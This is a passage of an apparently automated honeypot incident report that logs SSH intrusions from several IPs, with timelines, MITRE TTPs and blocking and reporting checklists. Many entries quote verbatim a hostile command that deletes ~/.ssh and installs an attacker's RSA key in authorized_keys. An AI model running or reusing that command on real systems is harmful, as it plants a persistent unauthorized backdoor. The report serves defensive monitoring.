- [ ] Submit `161.35.65[.]86` to AbuseIPDB if not already reported
- [ ] Block `161.35.65[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e12dc0bc3666

| Field | Detail |
|---|---|
| **Source IP** | `42.200.66[.]164` |
| **First Seen** | 2026-06-02 20:42 |
| **Last Seen** | 2026-06-02 20:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:42:31` | `cowrie.session.connect` |
| `2026-06-02 20:42:31` | `cowrie.client.version` |
| `2026-06-02 20:42:31` | `cowrie.client.kex` |
| `2026-06-02 20:42:31` | `cowrie.login.success` |
| `2026-06-02 20:42:32` | `cowrie.session.params` |
| `2026-06-02 20:42:32` | `cowrie.command.input` |
| `2026-06-02 20:42:32` | `cowrie.command.failed` |
| `2026-06-02 20:42:32` | `cowrie.log.closed` |
| `2026-06-02 20:42:32` | `cowrie.session.params` |
| `2026-06-02 20:42:32` | `cowrie.command.input` |
| `2026-06-02 20:42:32` | `cowrie.session.file_download` |
| `2026-06-02 20:42:32` | `cowrie.log.closed` |
| `2026-06-02 20:42:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.200.66[.]164` to AbuseIPDB if not already reported
- [ ] Block `42.200.66[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e0c94d9a2c5

| Field | Detail |
|---|---|
| **Source IP** | `42.200.66[.]164` |
| **First Seen** | 2026-06-02 20:42 |
| **Last Seen** | 2026-06-02 20:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:42:34` | `cowrie.session.connect` |
| `2026-06-02 20:42:34` | `cowrie.client.version` |
| `2026-06-02 20:42:34` | `cowrie.client.kex` |
| `2026-06-02 20:42:35` | `cowrie.login.success` |
| `2026-06-02 20:42:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.200.66[.]164` to AbuseIPDB if not already reported
- [ ] Block `42.200.66[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-027f33140d69

| Field | Detail |
|---|---|
| **Source IP** | `54.37.74[.]179` |
| **First Seen** | 2026-06-02 20:45 |
| **Last Seen** | 2026-06-02 20:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:45:00` | `cowrie.session.connect` |
| `2026-06-02 20:45:00` | `cowrie.client.version` |
| `2026-06-02 20:45:00` | `cowrie.client.kex` |
| `2026-06-02 20:45:01` | `cowrie.login.success` |
| `2026-06-02 20:45:01` | `cowrie.session.params` |
| `2026-06-02 20:45:01` | `cowrie.command.input` |
| `2026-06-02 20:45:01` | `cowrie.command.failed` |
| `2026-06-02 20:45:01` | `cowrie.log.closed` |
| `2026-06-02 20:45:02` | `cowrie.session.params` |
| `2026-06-02 20:45:02` | `cowrie.command.input` |
| `2026-06-02 20:45:02` | `cowrie.session.file_download` |
| `2026-06-02 20:45:02` | `cowrie.log.closed` |
| `2026-06-02 20:45:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.74[.]179` to AbuseIPDB if not already reported
- [ ] Block `54.37.74[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a4d71d48699

| Field | Detail |
|---|---|
| **Source IP** | `54.37.74[.]179` |
| **First Seen** | 2026-06-02 20:45 |
| **Last Seen** | 2026-06-02 20:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:45:04` | `cowrie.session.connect` |
| `2026-06-02 20:45:04` | `cowrie.client.version` |
| `2026-06-02 20:45:04` | `cowrie.client.kex` |
| `2026-06-02 20:45:05` | `cowrie.login.success` |
| `2026-06-02 20:45:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.74[.]179` to AbuseIPDB if not already reported
- [ ] Block `54.37.74[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90010ec17815

| Field | Detail |
|---|---|
| **Source IP** | `46.24.47[.]94` |
| **First Seen** | 2026-06-02 20:46 |
| **Last Seen** | 2026-06-02 20:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:46:51` | `cowrie.session.connect` |
| `2026-06-02 20:46:51` | `cowrie.client.version` |
| `2026-06-02 20:46:52` | `cowrie.client.kex` |
| `2026-06-02 20:46:53` | `cowrie.login.success` |
| `2026-06-02 20:46:53` | `cowrie.session.params` |
| `2026-06-02 20:46:53` | `cowrie.command.input` |
| `2026-06-02 20:46:53` | `cowrie.command.failed` |
| `2026-06-02 20:46:54` | `cowrie.log.closed` |
| `2026-06-02 20:46:54` | `cowrie.session.params` |
| `2026-06-02 20:46:54` | `cowrie.command.input` |
| `2026-06-02 20:46:54` | `cowrie.session.file_download` |
| `2026-06-02 20:46:54` | `cowrie.log.closed` |
| `2026-06-02 20:46:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.24.47[.]94` to AbuseIPDB if not already reported
- [ ] Block `46.24.47[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b6e701adbcd

| Field | Detail |
|---|---|
| **Source IP** | `54.37.74[.]179` |
| **First Seen** | 2026-06-02 20:46 |
| **Last Seen** | 2026-06-02 20:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:46:53` | `cowrie.session.connect` |
| `2026-06-02 20:46:53` | `cowrie.client.version` |
| `2026-06-02 20:46:53` | `cowrie.client.kex` |
| `2026-06-02 20:46:53` | `cowrie.login.success` |
| `2026-06-02 20:46:54` | `cowrie.session.params` |
| `2026-06-02 20:46:54` | `cowrie.command.input` |
| `2026-06-02 20:46:54` | `cowrie.command.failed` |
| `2026-06-02 20:46:54` | `cowrie.log.closed` |
| `2026-06-02 20:46:54` | `cowrie.session.params` |
| `2026-06-02 20:46:54` | `cowrie.command.input` |
| `2026-06-02 20:46:54` | `cowrie.session.file_download` |
| `2026-06-02 20:46:54` | `cowrie.log.closed` |
| `2026-06-02 20:46:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.74[.]179` to AbuseIPDB if not already reported
- [ ] Block `54.37.74[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-103a69eed0de

| Field | Detail |
|---|---|
| **Source IP** | `54.37.74[.]179` |
| **First Seen** | 2026-06-02 20:46 |
| **Last Seen** | 2026-06-02 20:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:46:56` | `cowrie.session.connect` |
| `2026-06-02 20:46:56` | `cowrie.client.version` |
| `2026-06-02 20:46:56` | `cowrie.client.kex` |
| `2026-06-02 20:46:57` | `cowrie.login.success` |
| `2026-06-02 20:46:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.74[.]179` to AbuseIPDB if not already reported
- [ ] Block `54.37.74[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac367f088594

| Field | Detail |
|---|---|
| **Source IP** | `46.24.47[.]94` |
| **First Seen** | 2026-06-02 20:46 |
| **Last Seen** | 2026-06-02 20:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:46:57` | `cowrie.session.connect` |
| `2026-06-02 20:46:57` | `cowrie.client.version` |
| `2026-06-02 20:46:58` | `cowrie.client.kex` |
| `2026-06-02 20:46:59` | `cowrie.login.success` |
| `2026-06-02 20:46:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.24.47[.]94` to AbuseIPDB if not already reported
- [ ] Block `46.24.47[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a46a69905f8

| Field | Detail |
|---|---|
| **Source IP** | `42.200.66[.]164` |
| **First Seen** | 2026-06-02 20:47 |
| **Last Seen** | 2026-06-02 20:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:47:56` | `cowrie.session.connect` |
| `2026-06-02 20:47:56` | `cowrie.client.version` |
| `2026-06-02 20:47:57` | `cowrie.client.kex` |
| `2026-06-02 20:47:57` | `cowrie.login.success` |
| `2026-06-02 20:47:57` | `cowrie.session.params` |
| `2026-06-02 20:47:57` | `cowrie.command.input` |
| `2026-06-02 20:47:57` | `cowrie.command.failed` |
| `2026-06-02 20:47:58` | `cowrie.log.closed` |
| `2026-06-02 20:47:58` | `cowrie.session.params` |
| `2026-06-02 20:47:58` | `cowrie.command.input` |
| `2026-06-02 20:47:58` | `cowrie.session.file_download` |
| `2026-06-02 20:47:58` | `cowrie.log.closed` |
| `2026-06-02 20:48:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.200.66[.]164` to AbuseIPDB if not already reported
- [ ] Block `42.200.66[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5eaf019c717

| Field | Detail |
|---|---|
| **Source IP** | `42.200.66[.]164` |
| **First Seen** | 2026-06-02 20:48 |
| **Last Seen** | 2026-06-02 20:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:48:00` | `cowrie.session.connect` |
| `2026-06-02 20:48:00` | `cowrie.client.version` |
| `2026-06-02 20:48:00` | `cowrie.client.kex` |
| `2026-06-02 20:48:01` | `cowrie.login.success` |
| `2026-06-02 20:48:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.200.66[.]164` to AbuseIPDB if not already reported
- [ ] Block `42.200.66[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-126e239ec7df

| Field | Detail |
|---|---|
| **Source IP** | `161.35.65[.]86` |
| **First Seen** | 2026-06-02 20:48 |
| **Last Seen** | 2026-06-02 20:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:48:28` | `cowrie.session.connect` |
| `2026-06-02 20:48:28` | `cowrie.client.version` |
| `2026-06-02 20:48:28` | `cowrie.client.kex` |
| `2026-06-02 20:48:29` | `cowrie.login.success` |
| `2026-06-02 20:48:29` | `cowrie.session.params` |
| `2026-06-02 20:48:29` | `cowrie.command.input` |
| `2026-06-02 20:48:29` | `cowrie.command.failed` |
| `2026-06-02 20:48:29` | `cowrie.log.closed` |
| `2026-06-02 20:48:29` | `cowrie.session.params` |
| `2026-06-02 20:48:29` | `cowrie.command.input` |
| `2026-06-02 20:48:29` | `cowrie.session.file_download` |
| `2026-06-02 20:48:29` | `cowrie.log.closed` |
| `2026-06-02 20:48:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.65[.]86` to AbuseIPDB if not already reported
- [ ] Block `161.35.65[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05a4c46e7357

| Field | Detail |
|---|---|
| **Source IP** | `161.35.65[.]86` |
| **First Seen** | 2026-06-02 20:48 |
| **Last Seen** | 2026-06-02 20:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:48:31` | `cowrie.session.connect` |
| `2026-06-02 20:48:31` | `cowrie.client.version` |
| `2026-06-02 20:48:32` | `cowrie.client.kex` |
| `2026-06-02 20:48:32` | `cowrie.login.success` |
| `2026-06-02 20:48:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.65[.]86` to AbuseIPDB if not already reported
- [ ] Block `161.35.65[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a3b9b47a792

| Field | Detail |
|---|---|
| **Source IP** | `46.24.47[.]94` |
| **First Seen** | 2026-06-02 20:48 |
| **Last Seen** | 2026-06-02 20:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:48:39` | `cowrie.session.connect` |
| `2026-06-02 20:48:39` | `cowrie.client.version` |
| `2026-06-02 20:48:39` | `cowrie.client.kex` |
| `2026-06-02 20:48:40` | `cowrie.login.success` |
| `2026-06-02 20:48:41` | `cowrie.session.params` |
| `2026-06-02 20:48:41` | `cowrie.command.input` |
| `2026-06-02 20:48:41` | `cowrie.command.failed` |
| `2026-06-02 20:48:41` | `cowrie.log.closed` |
| `2026-06-02 20:48:42` | `cowrie.session.params` |
| `2026-06-02 20:48:42` | `cowrie.command.input` |
| `2026-06-02 20:48:42` | `cowrie.session.file_download` |
| `2026-06-02 20:48:42` | `cowrie.log.closed` |
| `2026-06-02 20:48:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.24.47[.]94` to AbuseIPDB if not already reported
- [ ] Block `46.24.47[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93ac30f71e0f

| Field | Detail |
|---|---|
| **Source IP** | `46.24.47[.]94` |
| **First Seen** | 2026-06-02 20:48 |
| **Last Seen** | 2026-06-02 20:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:48:45` | `cowrie.session.connect` |
| `2026-06-02 20:48:45` | `cowrie.client.version` |
| `2026-06-02 20:48:45` | `cowrie.client.kex` |
| `2026-06-02 20:48:46` | `cowrie.login.success` |
| `2026-06-02 20:48:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.24.47[.]94` to AbuseIPDB if not already reported
- [ ] Block `46.24.47[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0be9938060de

| Field | Detail |
|---|---|
| **Source IP** | `54.37.74[.]179` |
| **First Seen** | 2026-06-02 20:50 |
| **Last Seen** | 2026-06-02 20:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:50:27` | `cowrie.session.connect` |
| `2026-06-02 20:50:27` | `cowrie.client.version` |
| `2026-06-02 20:50:27` | `cowrie.client.kex` |
| `2026-06-02 20:50:28` | `cowrie.login.success` |
| `2026-06-02 20:50:28` | `cowrie.session.params` |
| `2026-06-02 20:50:28` | `cowrie.command.input` |
| `2026-06-02 20:50:28` | `cowrie.command.failed` |
| `2026-06-02 20:50:28` | `cowrie.log.closed` |
| `2026-06-02 20:50:29` | `cowrie.session.params` |
| `2026-06-02 20:50:29` | `cowrie.command.input` |
| `2026-06-02 20:50:29` | `cowrie.session.file_download` |
| `2026-06-02 20:50:29` | `cowrie.log.closed` |
| `2026-06-02 20:50:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.74[.]179` to AbuseIPDB if not already reported
- [ ] Block `54.37.74[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c7c456c7f40

| Field | Detail |
|---|---|
| **Source IP** | `54.37.74[.]179` |
| **First Seen** | 2026-06-02 20:50 |
| **Last Seen** | 2026-06-02 20:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:50:31` | `cowrie.session.connect` |
| `2026-06-02 20:50:31` | `cowrie.client.version` |
| `2026-06-02 20:50:31` | `cowrie.client.kex` |
| `2026-06-02 20:50:31` | `cowrie.login.success` |
| `2026-06-02 20:50:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.74[.]179` to AbuseIPDB if not already reported
- [ ] Block `54.37.74[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c984a3540a20

| Field | Detail |
|---|---|
| **Source IP** | `42.200.66[.]164` |
| **First Seen** | 2026-06-02 20:51 |
| **Last Seen** | 2026-06-02 20:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
